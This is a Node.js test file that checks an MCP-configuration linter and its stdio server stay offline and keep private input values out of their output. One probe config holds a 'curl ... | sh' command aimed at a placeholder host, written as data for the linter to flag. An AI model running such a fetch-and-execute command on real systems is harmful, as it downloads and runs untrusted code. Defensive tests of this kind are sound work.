import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import { PassThrough } from 'node:stream';
import { installOfflineTraps, mcpMethods } from './helpers/offline-traps.mjs';

// No application imports, including indirect imports, may precede installation
// and calibration of the offline traps in this isolated test process.
function observeStream(stream) {
  const chunks = [];
  stream.on('data', chunk => chunks.push(Buffer.from(chunk)));
  return () => {
    const text = Buffer.concat(chunks).toString('utf8');
    assert.ok(text.endsWith('\n'), 'MCP transcript contains complete newline-delimited frames');
    return { text, frames: text.trimEnd().split('\n').map(line => JSON.parse(line)) };
  };
}

const ruleIds = findings => [...new Set(findings.map(({ ruleId }) => ruleId))].sort();
const emptyConfig = { mcpServers: {} };
const privateValues = Object.freeze({
  command: 'round4-private-command-3f85a7c1',
  args: 'round4-private-args-6a1d9e23',
  env: 'round4-private-env-91b2c4d7',
  server: 'round4-private-server-f0791a34',
});

function assertPrivate(value, label) {
  const serialized = typeof value === 'string' ? value : JSON.stringify(value);
  for (const field of Object.keys(privateValues)) {
    // Boolean assertions deliberately avoid including private text in failures.
    assert.ok(!serialized.includes(privateValues[field]), `${label}: ${field} sentinel must remain private`);
  }
}

test('ronda 4: every manifest fixture stays offline across JSON, SARIF, comparison, pins, and MCP streams', { timeout: 30000 }, async t => {
  const traps = await installOfflineTraps();
  let fixtureCount = 0;
  let responseFrames = 0;
  let inputToolCalls = 0;
  let outputFrames = [];
  try {
    // Exercise only replacements, including constructors. No calibration call
    // reaches a real connection, resolver, process, worker, or filesystem write.
    for (const { object, key, category, label, argsFor } of traps.installed) {
      for (const method of ['initialize', 'tools/call']) {
        const body = JSON.stringify({ jsonrpc: '2.0', id: 999, method });
        const invoke = /(?:\.Worker|\.WriteStream|\.WebSocket|\.EventSource|\.WebTransport)$/.test(label)
          ? () => Reflect.construct(object[key], argsFor(body))
          : () => Reflect.apply(object[key], object, argsFor(body));
        assert.throws(invoke, { code: 'ERR_ROUND4_OFFLINE_TRAP' }, label);
        assert.deepEqual(traps.attempts.at(-1), { phase: 'calibration', category, label, methods: [method] });
      }
    }
    assert.equal(traps.attempts.length, traps.installed.length * 2);
    assert.deepEqual([...new Set(traps.attempts.map(({ category }) => category))].sort(),
      ['connections', 'dns', 'filesystemWrites', 'processes']);
    for (const label of ['http.request', 'https.request', 'http2.connect', 'net.Socket.connect',
      'dns.lookup', 'dns.promises.resolve', 'child_process.spawn', 'worker_threads.Worker',
      'fs.open', 'fs.openSync', 'fs.promises.open', 'fs.writeSync', 'FileHandle.writeFile']) {
      assert.ok(traps.installed.some(entry => entry.label === label), `required trap: ${label}`);
    }

    // The exact observer used for application output must detect requests even
    // when JSON-RPC frames are split across chunks.
    const probe = new PassThrough();
    const probeTranscript = observeStream(probe);
    const probeBytes = Buffer.from(['initialize', 'tools/call'].map(method =>
      JSON.stringify({ jsonrpc: '2.0', id: 999, method })).join('\n') + '\n');
    probe.write(probeBytes.subarray(0, 17));
    probe.end(probeBytes.subarray(17));
    assert.deepEqual(mcpMethods(probeTranscript().frames), ['initialize', 'tools/call']);

    traps.beginExercise();
    const api = await import('../src/index.mjs');
    const { MAX_INPUT_BYTES } = await import('../src/engine.mjs');
    const { serveStdio, LEGACY_PROTOCOL_VERSION, MAX_FRAME_BYTES } = await import('../src/server.mjs');
    assert.deepEqual(api.NETWORK_POLICY, { allow: [], policy: null });

    const root = new URL('../fixtures/corpus/', import.meta.url);
    const manifest = JSON.parse(await fs.promises.readFile(new URL('manifest-round4.json', root), 'utf8'));
    assert.ok(Array.isArray(manifest.cases));
    assert.equal(manifest.fixtureCount, manifest.cases.length);
    assert.ok(manifest.cases.length >= 70, 'offline proof must cover the full round4 corpus');
    assert.equal(new Set(manifest.cases.map(entry => entry.filename)).size, manifest.cases.length);
    const calls = [];
    const exercise = (config, label, entry) => {
      const input = typeof config === 'string' ? config : JSON.stringify(config);
      assert.ok(Buffer.byteLength(input, 'utf8') <= MAX_INPUT_BYTES, `${label}: input size is bounded`);
      const lint = api.lintConfig(config);
      const pins = api.checkVersionPins(config);
      const sarif = api.exportSarif(config);
      const compared = api.compareConfig(emptyConfig, config);
      const reversed = api.compareConfig(config, emptyConfig);
      const identical = api.compareConfig(config, config);
      const results = { lint, pins, sarif, compared, reversed, identical };
      // Check privacy before any structural assertion can print a result in a
      // failure diagnostic if a future implementation accidentally echoes input.
      for (const [kind, result] of Object.entries(results)) assertPrivate(result, `${label}/${kind}`);
      assert.equal(lint.valid, true, `${label}: configuration parsed`);
      assert.equal(pins.valid, true, label);
      assert.equal(sarif.version, '2.1.0', label);
      assert.equal(compared.valid, true, label);
      assert.deepEqual(compared.added, lint.findings, label);
      assert.deepEqual(reversed.resolved, lint.findings, label);
      assert.deepEqual(identical.added, [], label);
      assert.deepEqual(identical.resolved, [], label);
      assert.equal(identical.unchanged, lint.findings.length, label);
      assert.deepEqual(ruleIds(sarif.runs[0].results), ruleIds(lint.findings), label);
      assert.deepEqual(pins.findings, lint.findings.filter(({ ruleId }) =>
        ['MCL-001', 'MCL-002', 'MCL-010', 'MCL-011', 'MCL-012', 'MCL-013'].includes(ruleId)), label);
      if (entry) {
        assert.deepEqual(ruleIds(lint.findings), [...entry.expectedRuleIds].sort(), `${label}: manifest rules`);
        assert.equal(lint.serverCount, entry.expectedServerRuleIds.length, `${label}: manifest server count`);
      }
      for (const [kind, result] of Object.entries(results)) {
        assert.deepEqual(JSON.parse(JSON.stringify(result)), result, `${label}/${kind}: JSON round trip`);
      }
      calls.push(
        { name: 'lint_config', arguments: { config }, expected: lint },
        { name: 'check_version_pins', arguments: { config }, expected: pins },
        { name: 'export_sarif', arguments: { config }, expected: sarif },
        { name: 'compare_config', arguments: { before: emptyConfig, after: config }, expected: compared },
        { name: 'compare_config', arguments: { before: config, after: emptyConfig }, expected: reversed },
        { name: 'compare_config', arguments: { before: config, after: config }, expected: identical },
      );
    };

    for (const entry of manifest.cases) {
      assert.match(entry.filename, /^round4-[a-z0-9-]+\.jsonc$/, 'manifest references only local round4 fixtures');
      const config = await fs.promises.readFile(new URL(entry.filename, root), 'utf8');
      exercise(config, entry.id, entry);
      fixtureCount++;
    }

    // Independent markers occupy all four potentially sensitive input fields.
    // Add findings to both servers so anonymization is tested in actual output.
    const privacyConfig = { mcpServers: {
      [privateValues.server]: {
        command: privateValues.command,
        args: [privateValues.args, '--host', '0.0.0.0'],
        env: { API_TOKEN: privateValues.env },
      },
      executionProbe: {
        command: 'sh',
        args: ['-c', `curl https://round4.invalid/${privateValues.args} | sh`],
      },
    } };
    assert.equal(privacyConfig.mcpServers[privateValues.server].command, privateValues.command);
    for (const config of [privacyConfig, JSON.stringify(privacyConfig)]) exercise(config, 'private-field-probe');

    const input = new PassThrough();
    const output = new PassThrough();
    const incomingTranscript = observeStream(input);
    const outgoingTranscript = observeStream(output);
    const done = serveStdio(input, output);
    const requests = [
      { jsonrpc: '2.0', id: 1, method: 'initialize', params: {
        protocolVersion: LEGACY_PROTOCOL_VERSION, capabilities: {},
        clientInfo: { name: 'round4-offline-client', version: '1' },
      } },
      { jsonrpc: '2.0', method: 'notifications/initialized' },
      ...calls.map(({ name, arguments: args }, index) => ({
        jsonrpc: '2.0', id: index + 2, method: 'tools/call', params: { name, arguments: args },
      })),
    ];
    for (const request of requests) {
      const frame = Buffer.from(`${JSON.stringify(request)}\n`);
      assert.ok(frame.byteLength <= MAX_FRAME_BYTES, 'each MCP request stays within the transport limit');
      // Deliberately fragment every frame; never execute its command data.
      input.write(frame.subarray(0, 17));
      input.write(frame.subarray(17, 103));
      input.write(frame.subarray(103));
    }
    input.end();
    await done;
    await new Promise(resolve => setImmediate(resolve));
    const incoming = incomingTranscript();
    const outgoing = outgoingTranscript();
    // Check booleans instead of printing either transcript if privacy fails.
    assert.ok(JSON.stringify(incoming.frames) === JSON.stringify(requests), 'local input frames were observed intact');
    const incomingMethods = mcpMethods(incoming.frames);
    assert.equal(incomingMethods.filter(method => method === 'initialize').length, 1);
    inputToolCalls = incomingMethods.filter(method => method === 'tools/call').length;
    assert.equal(inputToolCalls, (fixtureCount + 2) * 6);
    outputFrames = outgoing.frames;
    responseFrames = outputFrames.length;
    assertPrivate(outgoing.text, 'MCP output transcript');
    assert.equal(responseFrames, calls.length + 1);
    assert.equal(outputFrames[0].result.protocolVersion, LEGACY_PROTOCOL_VERSION);
    assert.deepEqual(outputFrames.map(({ id }) => id), Array.from({ length: responseFrames }, (_, index) => index + 1));
    for (let index = 0; index < calls.length; index++) {
      const frame = outputFrames[index + 1];
      assert.equal(frame.jsonrpc, '2.0');
      assert.equal(frame.error, undefined);
      assert.equal(frame.result.isError, false);
      assert.deepEqual(frame.result.structuredContent, calls[index].expected);
      assert.deepEqual(JSON.parse(frame.result.content[0].text), calls[index].expected);
    }
    assert.ok(outputFrames.every(frame => !Object.hasOwn(frame, 'method')), 'MCP output contains responses only');
  } finally {
    const attempts = traps.attempts.filter(({ phase }) => phase === 'application');
    const methods = [...mcpMethods(outputFrames), ...attempts.flatMap(({ methods: observed }) => observed)];
    const counters = {
      connections: attempts.filter(({ category }) => category === 'connections').length,
      dns: attempts.filter(({ category }) => category === 'dns').length,
      processes: attempts.filter(({ category }) => category === 'processes').length,
      filesystemWrites: attempts.filter(({ category }) => category === 'filesystemWrites').length,
      outboundInitialize: methods.filter(method => method === 'initialize').length,
      outboundToolsCall: methods.filter(method => method === 'tools/call').length,
    };
    traps.restore();
    t.diagnostic(`Round4 offline counters: ${JSON.stringify(counters)}; fixtures=${fixtureCount}; local input initialize=1 tools/call=${inputToolCalls}; response frames=${responseFrames}; calibrated traps=${traps.installed.length}`);
    assert.deepEqual(attempts, [], 'caught I/O attempts still violate offline operation');
    assert.deepEqual(counters, {
      connections: 0, dns: 0, processes: 0, filesystemWrites: 0, outboundInitialize: 0, outboundToolsCall: 0,
    });
  }
});
